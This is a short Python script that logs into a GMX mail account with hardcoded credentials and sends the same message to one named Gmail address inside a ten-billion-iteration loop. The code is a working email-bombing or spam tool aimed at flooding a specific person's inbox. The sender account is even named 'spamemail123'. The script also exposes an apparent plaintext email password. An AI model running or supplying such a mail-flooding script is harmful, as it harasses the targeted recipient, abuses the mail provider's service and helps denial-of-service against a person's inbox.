#! /usr/bin/env python
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

email='spamemail123@gmx.com'
password='spamemail123'
send_to_email='ruastabi@gmail.com'
subject='e-mail subject'
message='Message content'

msg= MIMEMultipart()
msg['From']= email
msg['To']=send_to_email
msg['subject']=subject

msg.attach(MIMEText(message, 'plain'))

server= smtplib.SMTP('mail.gmx.com',587)
server.starttls()
print(server.login(email,password))
text = msg.as_string()
for x in range(10000000000):
	server.sendmail(email, send_to_email, text)

server.quit()